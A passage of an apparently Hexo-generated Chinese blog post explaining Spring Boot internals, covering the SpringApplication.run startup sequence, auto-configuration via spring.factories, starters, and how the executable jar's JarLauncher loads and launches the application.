从spring.factories配置文件中加载exceptionReporters，其中ConfigurableApplicationContext.class作为FailureAnalyzers构造方法的参数</span></span><br><span class=\"line\"><span class=\"comment\">       * # Error Reporters</span></span><br><span class=\"line\"><span class=\"comment\">       * org.springframework.boot.SpringBootExceptionReporter=\\</span></span><br><span class=\"line\"><span class=\"comment\">       * org.springframework.boot.diagnostics.FailureAnalyzers</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\">      exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter.class,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123; ConfigurableApplicationContext.class &#125;, context);</span><br><span class=\"line\">      <span class=\"comment\">// 准备容器事项：调用各个ApplicationContextInitializer的initialize方法</span></span><br><span class=\"line\">      <span class=\"comment\">// 和触发SpringApplicationRunListeners的contextPrepared及contextLoaded方法等</span></span><br><span class=\"line\">      prepareContext(context, environment, listeners, applicationArguments, printedBanner);</span><br><span class=\"line\">      <span class=\"comment\">// 刷新容器，这一步至关重要</span></span><br><span class=\"line\">      refreshContext(context);</span><br><span class=\"line\">      <span class=\"comment\">// 执行刷新容器后的后置处理逻辑，注意这里为空方法</span></span><br><span class=\"line\">      afterRefresh(context, applicationArguments);</span><br><span class=\"line\">      <span class=\"comment\">// 停止stopWatch计时</span></span><br><span class=\"line\">      stopWatch.stop();</span><br><span class=\"line\">      <span class=\"comment\">// 打印springboot的启动时常</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.logStartupInfo) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">new</span> <span class=\"title class_\">StartupInfoLogger</span>(<span class=\"built_in\">this</span>.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// 触发SpringApplicationRunListener的started方法，通知spring容器已经启动</span></span><br><span class=\"line\">      listeners.started(context);</span><br><span class=\"line\">      <span class=\"comment\">// 调用ApplicationRunner和CommandLineRunner的run方法，实现spring容器启动后需要做的一些东西</span></span><br><span class=\"line\">      callRunners(context, applicationArguments);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"comment\">// 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。</span></span><br><span class=\"line\">   <span class=\"keyword\">catch</span> (Throwable ex) &#123;</span><br><span class=\"line\">      handleRunFailure(context, ex, exceptionReporters, listeners);</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(ex);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 当容器刷新完毕等，触发SpringApplicationRunListeners数组的running方法</span></span><br><span class=\"line\">      listeners.running(context);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">catch</span> (Throwable ex) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。</span></span><br><span class=\"line\">      handleRunFailure(context, ex, exceptionReporters, <span class=\"literal\">null</span>);</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(ex);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> context;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"怎么让Spring把Body变成一个对象\"><a href=\"#怎么让Spring把Body变成一个对象\" class=\"headerlink\" title=\"怎么让Spring把Body变成一个对象\"></a>怎么让Spring把Body变成一个对象</h2><ul>\n<li>@RequestBody注解原理</li>\n<li>详细看springmvc的处理流程</li>\n</ul>\n<h2 id=\"SpringBoot的starter实现原理是什么？\"><a href=\"#SpringBoot的starter实现原理是什么？\" class=\"headerlink\" title=\"SpringBoot的starter实现原理是什么？\"></a>SpringBoot的starter实现原理是什么？</h2><p>原理就是因为在@EnableAutoConfiguration注解，会自动的扫描jar包下的META-INF&#x2F;spring.factories文件的配置类，写在这里面的类都是需要被自动加载的</p>\n<p>将configuration类中定义的bean加入spring到容器中。就相当于加载之前我们自己配置组件的xml文件。而现在SpringBoot自己定义了一个默认的值，然后直接加载进入了Spring容器。</p>\n<p>SpringBoot提供的自动配置依赖模块都以spring-boot-starter-为命名前缀，并且这些依赖都在org.springframework.boot下。 所有的spring-boot-starter都有约定俗成的默认配置，但允许调整这些配置调整默认的行为。</p>\n<h2 id=\"spring-和springboot的区别\"><a href=\"#spring-和springboot的区别\" class=\"headerlink\" title=\"spring 和springboot的区别\"></a>spring 和springboot的区别</h2><p>Spring Boot基本上是Spring框架的扩展，它消除了设置Spring应用程序所需的XML配置，为更快，更高效的开发生态系统铺平了道路。</p>\n<p>Spring Boot中的一些特征：</p>\n<ul>\n<li>创建独立的Spring应用。</li>\n<li>嵌入式Tomcat、Jetty、 Undertow容器（无需部署war文件）。</li>\n<li>提供的starters 简化构建配置</li>\n<li>尽可能自动配置spring应用。</li>\n<li>提供生产指标,例如指标、健壮检查和外部化配置</li>\n<li>完全没有代码生成和XML配置要求</li>\n</ul>\n<p>Maven依赖</p>\n<p>首先，让我们看一下使用Spring创建Web应用程序所需的最小依赖项</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.1.0.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-webmvc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.1.0.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>与Spring不同，Spring Boot只需要一个依赖项来启动和运行Web应用程序：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.6.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在进行构建期间，所有其他依赖项将自动添加到项目中。</p>\n<p>另一个很好的例子就是测试库。我们通常使用Spring Test，JUnit，Hamcrest和Mockito库。在Spring项目中，我们应该将所有这些库添加为依赖项。但是在Spring Boot中，我们只需要添加spring-boot-starter-test依赖项来自动包含这些库。</p>\n<p>spring在运行前需要使用xml文件做很多配置，而springboot帮我们实现了这些配置的自动加载，基于注解和简单的yml配置即可</p>\n<p>spring的web程序还是打包为war然后再Tomcat里运行，而springboot内嵌了Tomcat直接打成可运行的jar</p>\n<h2 id=\"Spring-Boot-可执行-Jar-包运行原理\"><a href=\"#Spring-Boot-可执行-Jar-包运行原理\" class=\"headerlink\" title=\"Spring Boot 可执行 Jar 包运行原理\"></a>Spring Boot 可执行 Jar 包运行原理</h2><p>Spring Boot 有一个很方便的功能就是可以将应用打成可执行的 Jar。那么大家有没想过这个 Jar 是怎么运行起来的呢？本篇博客就来介绍下 Spring Boot 可执行 Jar 包的运行原理。</p>\n<h3 id=\"打可执行-Jar-包\"><a href=\"#打可执行-Jar-包\" class=\"headerlink\" title=\"打可执行 Jar 包\"></a>打可执行 Jar 包</h3><p>将 Spring Boot 应用打成可执行 Jar包很容易，只需要在 pom 中加上一个 Spring Boot 提供的插件，然后在执行mvn package即可</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>运行完mvn package后，我们会在 target 目录下看到两个 jar 文件。myproject-0.0.1-SNAPSHOT.jar 和 myproject-0.0.1-SNAPSHOT.jar.original。第一个 jar 文件就是我们应用的可执行 jar 包，第二个 Jar 文件是应用原始的 jar 包。</p>\n<h3 id=\"可执行-Jar-包内部结构\"><a href=\"#可执行-Jar-包内部结构\" class=\"headerlink\" title=\"可执行 Jar 包内部结构\"></a>可执行 Jar 包内部结构</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">可执行 jar 目录结构</span><br><span class=\"line\">├─BOOT-INF</span><br><span class=\"line\">│  ├─classes</span><br><span class=\"line\">│  └─lib</span><br><span class=\"line\">├─META-INF</span><br><span class=\"line\">│  ├─maven</span><br><span class=\"line\">│  ├─app.properties</span><br><span class=\"line\">│  ├─MANIFEST.MF      </span><br><span class=\"line\">└─org</span><br><span class=\"line\">    └─springframework</span><br><span class=\"line\">        └─boot</span><br><span class=\"line\">            └─loader</span><br><span class=\"line\">                ├─archive</span><br><span class=\"line\">                ├─data</span><br><span class=\"line\">                ├─jar</span><br><span class=\"line\">                └─util</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们先来重点关注两个地方：META-INF 下面的 Jar 包描述文件和 BOOT-INF 这个目录。</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">Manifest-Version</span>: <span class=\"string\">1.0</span></span><br><span class=\"line\"><span class=\"attr\">Archiver-Version</span>: <span class=\"string\">Plexus Archiver</span></span><br><span class=\"line\"><span class=\"attr\">Built-By</span>: <span class=\"string\">xxxx</span></span><br><span class=\"line\"><span class=\"attr\">Start-Class</span>: <span class=\"string\">com.xxxx.AppServer</span></span><br><span class=\"line\"><span class=\"attr\">Spring-Boot-Classes</span>: <span class=\"string\">BOOT-INF/classes/</span></span><br><span class=\"line\"><span class=\"attr\">Spring-Boot-Lib</span>: <span class=\"string\">BOOT-INF/lib/</span></span><br><span class=\"line\"><span class=\"attr\">Spring-Boot-Version</span>: <span class=\"string\">2.1.6.RELEASE</span></span><br><span class=\"line\"><span class=\"attr\">Created-By</span>: <span class=\"string\">Apache Maven 3.3.9</span></span><br><span class=\"line\"><span class=\"attr\">Build-Jdk</span>: <span class=\"string\">1.8.0_73</span></span><br><span class=\"line\"><span class=\"attr\">Main-Class</span>: <span class=\"string\">org.springframework.boot.loader.JarLauncher</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在上面我们看到一个熟悉的配置Main-Class: org.springframework.boot.loader.JarLauncher。我们大概能猜到这个类是整个系统的入口。</p>\n<p>再看下 BOOT-INF 这个目录下面，我们会发现里面是我们项目打出来的 class 文件和项目依赖的 Jar 包。看到这里，你可能已经猜到 Spring Boot 是怎么启动项目的了。</p>\n<h3 id=\"JarLauncher\"><a href=\"#JarLauncher\" class=\"headerlink\" title=\"JarLauncher\"></a>JarLauncher</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JarLauncher</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ExecutableArchiveLauncher</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">BOOT_INF_CLASSES</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;BOOT-INF/classes/&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">BOOT_INF_LIB</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;BOOT-INF/lib/&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"title function_\">JarLauncher</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">protected</span> <span class=\"title function_\">JarLauncher</span><span class=\"params\">(Archive archive)</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>(archive);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@Override</span></span><br><span class=\"line\">\t<span class=\"keyword\">protected</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isNestedArchive</span><span class=\"params\">(Archive.Entry entry)</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (entry.isDirectory()) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> entry.getName().equals(BOOT_INF_CLASSES);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> entry.getName().startsWith(BOOT_INF_LIB);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//项目入口，重点在launch这个方法中</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">new</span> <span class=\"title class_\">JarLauncher</span>().launch(args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//launch方法</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">launch</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    JarFile.registerUrlProtocolHandler();</span><br><span class=\"line\">    <span class=\"comment\">//创建LaunchedURLClassLoader。如果根类加载器和扩展类加载器没有加载到某个类的话，就会通过LaunchedURLClassLoader这个加载器来加载类。这个加载器会从Boot-INF下面的class目录和lib目录下加载类。</span></span><br><span class=\"line\">    <span class=\"type\">ClassLoader</span> <span class=\"variable\">classLoader</span> <span class=\"operator\">=</span> createClassLoader(getClassPathArchives());</span><br><span class=\"line\">    <span class=\"comment\">//这个方法会读取jar描述文件中的Start-Class属性，然后通过反射调用到这个类的main方法。</span></span><br><span class=\"line\">    launch(args, getMainClass(), classLoader);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>简单总结</p>\n<ul>\n<li>Spring Boot 可执行 Jar 包的入口点是 JarLauncher 的 main 方法；</li>\n<li>这个方法的执行逻辑是先创建一个 LaunchedURLClassLoader，这个加载器加载类的逻辑是：先判断根类加载器和扩展类加载器能否加载到某个类，如果都加载不到就从 Boot-INF 下面的 class 和 lib 目录下去加载；</li>\n<li>读取Start-Class属性，通过反射机制调用启动类的 main 方法，这样就顺利调用到我们开发的 Spring Boot 主启动类的 main 方法了。</li>\n</ul>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<h2 id=\"springboot启动流程\"><a href=\"#springboot启动流程\" class=\"headerlink\" title=\"springboot启动流程\"></a>springboot启动流程</h2><h3 id=\"启动类上注解：-SpringBootApplication\"><a href=\"#启动类上注解：-SpringBootApplication\" class=\"headerlink\" title=\"启动类上注解：@SpringBootApplication\"></a>启动类上注解：@SpringBootApplication</h3><h4 id=\"SpringBootConfiguration\"><a href=\"#SpringBootConfiguration\" class=\"headerlink\" title=\"@SpringBootConfiguration\"></a>@SpringBootConfiguration</h4><p>根据Javadoc可知，该注解作用就是将当前的类作为一个JavaConfig，然后触发注解@EnableAutoConfiguration和@ComponentScan的处理，本质上与@Configuration注解没有区别</p>\n<h4 id=\"EnableAutoConfiguration\"><a href=\"#EnableAutoConfiguration\" class=\"headerlink\" title=\"@EnableAutoConfiguration\"></a>@EnableAutoConfiguration</h4><p>@EnableAutoConfiguration:实现自动装配的核心注解</p>\n<ul>\n<li>@AutoConfigurationPackage<ul>\n<li>注册当前启动类的根 package</li>\n<li>注册 org.springframework.boot.autoconfigure.AutoConfigurationPackages 的 BeanDefinition</li>\n</ul>\n</li>\n<li>@Import(AutoConfigurationImportSelector.class)<ul>\n<li>自动装配核心功能的实现实际是通过 AutoConfigurationImportSelector(加载自动装配类)类</li>\n<li>AutoConfigurationImportSelector 类实现了 ImportSelector接口<ul>\n<li>实现了这个接口中的 selectImports方法<ul>\n<li>方法实现 重要的getAutoConfigurationEntry()方法<ol>\n<li>判断自动装配是否打开，默认是true可以通过application.yml设置</li>\n<li>获取@EnableAutoConfiguration里的exclude和excludeName内容以便排除</li>\n<li>获取需要自动装配的所有配置类，读取META-INF&#x2F;spring.factories druid 数据库连接池的 Spring Boot Starter 就创建了META-INF&#x2F;spring.factories文件</li>\n<li>筛选满足@ConditionalOnXXX注解的类，生效才会被加载</li>\n</ol>\n</li>\n<li>该方法主要用于获取所有符合条件的类的全限定类名，这些类需要被加载到 IoC 容器中</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"ComponentScan\"><a href=\"#ComponentScan\" class=\"headerlink\" title=\"@ComponentScan\"></a>@ComponentScan</h4><p>扫描的 Spring 对应的组件，如 @Componet，@Repository</p>\n<ul>\n<li>我们可以通过 basePackages 等属性来细粒度的定制 @ComponentScan 自动扫描的范围，如果不指定，则默认Spring框架实现会从声明 @ComponentScan 所在类的package进行扫描，所以 SpringBoot 的启动类最好是放在根package下，我们自定义的类就放在对应的子package下，这样就可以不指定 basePackages</li>\n</ul>\n<h3 id=\"启动类中的main方法：org-springframework-boot-SpringApplication-run-java-lang-Class-java-lang-String…\"><a href=\"#启动类中的main方法：org-springframework-boot-SpringApplication-run-java-lang-Class-java-lang-String…\" class=\"headerlink\" title=\"启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class&lt;?&gt;, java.lang.String…)\"></a>启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class&lt;?&gt;, java.lang.String…)</h3><ul>\n<li>从spring.factories配置文件中加载EventPublishingRunListener对象，该对象拥有SimpleApplicationEventMulticaster属性，即在SpringBoot启动过程的不同阶段用来发射内置的生命周期事件;<ul>\n<li>spring-bean包下META-INF&#x2F;spring.factories</li>\n</ul>\n</li>\n<li>准备环境变量，包括系统变量，环境变量，命令行参数，默认变量，servlet相关配置变量，随机值以及配置文件（比如application.properties）等;<ul>\n<li>而后就会去创建Environment——这个时候会去加载application配置文件</li>\n</ul>\n</li>\n<li>控制台打印SpringBoot的bannner标志；</li>\n<li>根据不同类型环境创建不同类型的applicationcontext容器，因为这里是servlet环境，所以创建的是AnnotationConfigServletWebServerApplicationContext容器对象；</li>\n<li>从spring.factories配置文件中加载FailureAnalyzers对象,用来报告SpringBoot启动过程中的异常；</li>\n<li>为刚创建的容器对象做一些初始化工作，准备一些容器属性值等，对ApplicationContext应用一些相关的后置处理和调用各个ApplicationContextInitializer的初始化方法来执行一些初始化逻辑等；</li>\n<li>刷新容器，这一步至关重要。比如调用bean factory的后置处理器，注册BeanPostProcessor后置处理器，初始化事件广播器且广播事件，初始化剩下的单例bean和SpringBoot创建内嵌的Tomcat服务器等等重要且复杂的逻辑都在这里实现，主要步骤可见代码的注释，关于这里的逻辑会在以后的spring源码分析专题详细分析；<ul>\n<li>&#x2F;&#x2F; 1）在context刷新前做一些准备工作，比如初始化一些属性设置，属性合法性校验和保存容器中的一些早期事件等；</li>\n<li>&#x2F;&#x2F; 2）让子类刷新其内部bean factory,注意SpringBoot和Spring启动的情况执行逻辑不一样</li>\n<li>&#x2F;&#x2F; 3）对bean factory进行配置，比如配置bean factory的类加载器，后置处理器等</li>\n<li>&#x2F;&#x2F; 4）完成bean factory的准备工作后，此时执行一些后置处理逻辑，子类通过重写这个方法来在BeanFactory创建并预准备完成以后做进一步的设置<ul>\n<li>&#x2F;&#x2F; 在这一步，所有的bean definitions将会被加载，但此时bean还不会被实例化</li>\n</ul>\n</li>\n<li>&#x2F;&#x2F; 5）执行BeanFactoryPostProcessor的方法即调用bean factory的后置处理器：<ul>\n<li>&#x2F;&#x2F; BeanDefinitionRegistryPostProcessor（触发时机：bean定义注册之前）和BeanFactoryPostProcessor（触发时机：bean定义注册之后bean实例化之前）</li>\n</ul>\n</li>\n<li>&#x2F;&#x2F; 6）注册bean的后置处理器BeanPostProcessor，注意不同接口类型的BeanPostProcessor；在Bean创建前后的执行时机是不一样的</li>\n<li>&#x2F;&#x2F; 7）初始化国际化MessageSource相关的组件，比如消息绑定，消息解析等</li>\n<li>&#x2F;&#x2F; 8）初始化事件广播器，如果bean factory没有包含事件广播器，那么new一个SimpleApplicationEventMulticaster广播器对象并注册到bean factory中</li>\n<li>&#x2F;&#x2F; 9）AbstractApplicationContext定义了一个模板方法onRefresh，留给子类覆写，比如ServletWebServerApplicationContext覆写了该方法来创建内嵌的tomcat容器</li>\n<li>&#x2F;&#x2F; 10）注册实现了ApplicationListener接口的监听器，之前已经有了事件广播器，此时就可以派发一些early application events</li>\n<li>&#x2F;&#x2F; 11）完成容器bean factory的初始化，并初始化所有剩余的单例bean。这一步非常重要，一些bean postprocessor会在这里调用。</li>\n<li>&#x2F;&#x2F; 12）完成容器的刷新工作，并且调用生命周期处理器的onRefresh()方法，并且发布ContextRefreshedEvent事件</li>\n</ul>\n</li>\n<li>执行刷新容器后的后置处理逻辑，注意这里为空方法；</li>\n<li>调用ApplicationRunner和CommandLineRunner的run方法，我们实现这两个接口可以在spring容器启动后需要的一些东西比如加载一些业务数据等;</li>\n<li>报告启动异常，即若启动过程中抛出异常，此时用FailureAnalyzers来报告异常;</li>\n<li>最终返回容器对象，这里调用方法没有声明对象来接收。<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">   SpringApplication.run(<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>&lt;?&gt;[<span class=\"number\">0</span>], args);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> ConfigurableApplicationContext <span class=\"title function_\">run</span><span class=\"params\">(Class&lt;?&gt;[] primarySources, String[] args)</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">// 新建SpringApplication对象，再调用run方法</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SpringApplication</span>(primarySources).run(args);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> ConfigurableApplicationContext <span class=\"title function_\">run</span><span class=\"params\">(String... args)</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">// stopWatch用于统计run启动过程时长</span></span><br><span class=\"line\">   <span class=\"type\">StopWatch</span> <span class=\"variable\">stopWatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StopWatch</span>();</span><br><span class=\"line\">   <span class=\"comment\">// 开始计时</span></span><br><span class=\"line\">   stopWatch.start();</span><br><span class=\"line\">   <span class=\"comment\">// 创建ConfigurableApplicationContext对象</span></span><br><span class=\"line\">   <span class=\"type\">ConfigurableApplicationContext</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">   <span class=\"comment\">// exceptionReporters集合用来存储SpringApplication启动过程的异常，SpringBootExceptionReporter且通过spring.factories方式来加载</span></span><br><span class=\"line\">   Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">   <span class=\"comment\">// 配置headless属性</span></span><br><span class=\"line\">   configureHeadlessProperty();</span><br><span class=\"line\">   <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">    * 从spring.factories配置文件中加载到EventPublishingRunListener对象并赋值给SpringApplicationRunListeners</span></span><br><span class=\"line\"><span class=\"comment\">    * # Run Listeners</span></span><br><span class=\"line\"><span class=\"comment\">    * org.springframework.boot.SpringApplicationRunListener=\\</span></span><br><span class=\"line\"><span class=\"comment\">    * org.springframework.boot.context.event.EventPublishingRunListener</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">   <span class=\"type\">SpringApplicationRunListeners</span> <span class=\"variable\">listeners</span> <span class=\"operator\">=</span> getRunListeners(args);</span><br><span class=\"line\">   <span class=\"comment\">// 启动SpringApplicationRunListeners监听</span></span><br><span class=\"line\">   listeners.starting();</span><br><span class=\"line\">   <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 创建ApplicationArguments对象，封装了args参数</span></span><br><span class=\"line\">      <span class=\"type\">ApplicationArguments</span> <span class=\"variable\">applicationArguments</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DefaultApplicationArguments</span>(args);</span><br><span class=\"line\">      <span class=\"comment\">// 备配置参数有app.properties，外部配置参数比如jvm启动参数等</span></span><br><span class=\"line\">      <span class=\"type\">ConfigurableEnvironment</span> <span class=\"variable\">environment</span> <span class=\"operator\">=</span> prepareEnvironment(listeners, applicationArguments);</span><br><span class=\"line\">      <span class=\"comment\">// 配置spring.beaninfo.ignore属性</span></span><br><span class=\"line\">      configureIgnoreBeanInfo(environment);</span><br><span class=\"line\">      <span class=\"comment\">// 打印springboot的bannner</span></span><br><span class=\"line\">      <span class=\"type\">Banner</span> <span class=\"variable\">printedBanner</span> <span class=\"operator\">=</span> printBanner(environment);</span><br><span class=\"line\">      <span class=\"comment\">// 根据不同类型创建不同类型的spring applicationcontext容器</span></span><br><span class=\"line\">      context = createApplicationContext();</span><br><span class=\"line\">      <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">       * 异常报告</span></span><br><span class=\"line\"><span class=\"comment\">       * 从spring.factories配置文件中加载exceptionReporters，其中ConfigurableApplicationContext.class作为FailureAnalyzers构造方法的参数</span></span><br><span class=\"line\"><span class=\"comment\">       * # Error Reporters</span></span><br><span class=\"line\"><span class=\"comment\">       * org.springframework.boot.SpringBootExceptionReporter=\\</span></span><br><span class=\"line\"><span class=\"comment\">       * org.springframework.boot.diagnostics.FailureAnalyzers</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\">      exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter.class,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123; ConfigurableApplicationContext.class &#125;, context);</span><br><span class=\"line\">      <span class=\"comment\">// 准备容器事项：调用各个ApplicationContextInitializer的initialize方法</span></span><br><span class=\"line\">      <span class=\"comment\">// 和触发SpringApplicationRunListeners的contextPrepared及contextLoaded方法等</span></span><br><span class=\"line\">      prepareContext(context, environment, listeners, applicationArguments, printedBanner);</span><br><span class=\"line\">      <span class=\"comment\">// 刷新容器，这一步至关重要</span></span><br><span class=\"line\">      refreshContext(context);</span><br><span class=\"line\">      <span class=\"comment\">// 